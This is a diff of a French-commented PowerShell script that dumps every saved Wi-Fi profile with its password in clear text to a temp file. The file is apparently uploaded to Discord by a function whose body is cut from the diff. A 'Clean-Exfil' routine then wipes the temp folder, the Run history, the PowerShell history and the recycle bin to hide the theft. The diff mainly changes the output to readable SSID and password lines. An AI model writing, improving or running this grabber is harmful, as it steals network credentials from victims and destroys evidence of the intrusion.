@@ -1,5 +1,5 @@
 # ===========================
-# FONCTION : EXPORTER PROFILS WIFI
+# FONCTION : EXPORTER PROFILS WIFI EN TEXTE LISIBLE
 # ===========================
 function Export-WiFiProfiles {
     $tempFolder = "$env:TEMP\WiFi_Profiles"
@@ -10,26 +10,27 @@ function Export-WiFiProfiles {
     # Exporter tous les profils en XML
     netsh wlan export profile key=clear folder=$tempFolder | Out-Null
 
-    # Créer un XML global
-    [xml]$allProfilesXml = New-Object System.Xml.XmlDocument
-    $root = $allProfilesXml.CreateElement("WiFiProfiles")
-    $allProfilesXml.AppendChild($root) | Out-Null
+    # Fichier texte final
+    $outputFile = "$env:TEMP\--wifi-pass.txt"
+    "" | Out-File -FilePath $outputFile -Encoding UTF8  # vider/créer le fichier
 
+    # Pour chaque profil, extraire SSID et mot de passe
     Get-ChildItem -Path $tempFolder -Filter *.xml | ForEach-Object {
         [xml]$profileXml = Get-Content $_.FullName
-        $importedNode = $allProfilesXml.ImportNode($profileXml.WLANProfile, $true)
-        $root.AppendChild($importedNode) | Out-Null
-    }
+        $ssid = $profileXml.WLANProfile.SSIDConfig.SSID.name
+        $password = $profileXml.WLANProfile.MSM.security.sharedKey.keyMaterial
+        if (-not $password) { $password = "[Aucun mot de passe]" }
 
-    # Sauvegarder le fichier unique (même nom que ton exemple : --wifi-pass.txt)
-    $outputFile = "$env:TEMP\--wifi-pass.txt"
-    $allProfilesXml.Save($outputFile)
+        Add-Content -Path $outputFile -Value "SSID : $ssid"
+        Add-Content -Path $outputFile -Value "Mot de passe : $password"
+        Add-Content -Path $outputFile -Value "----------------------------------------"
+    }
 
     return $outputFile
 }
 
 # ===========================
-# FONCTION : UPLOAD VERS DISCORD (déjà fournie)
+# FONCTION : UPLOAD VERS DISCORD
 # ===========================
 function Upload-Discord {
     [CmdletBinding()]
@@ -53,16 +54,12 @@ function Upload-Discord {
 }
 
 # ===========================
-# FONCTION : NETTOYAGE (adaptée à ton Clean-Exfil)
+# FONCTION : NETTOYAGE
 # ===========================
 function Clean-Exfil {
-    # vider le dossier TEMP
     rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-    # supprimer historique "Exécuter"
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-    # supprimer historique PowerShell
     Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    # vider corbeille
     Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
@@ -78,8 +75,6 @@ if (-not ([string]::IsNullOrEmpty($ce))) {
     Clean-Exfil
 }
 
-# Supprimer spécifiquement le fichier exporté si présent
 if (Test-Path "$env:TEMP\--wifi-pass.txt") {
-    Remove-Item "$env:TEMP\--wifi-pass.txt" -Force -ErrorAction Silently
-Continue
+    Remove-Item "$env:TEMP\--wifi-pass.txt" -Force -ErrorAction SilentlyContinue
 }
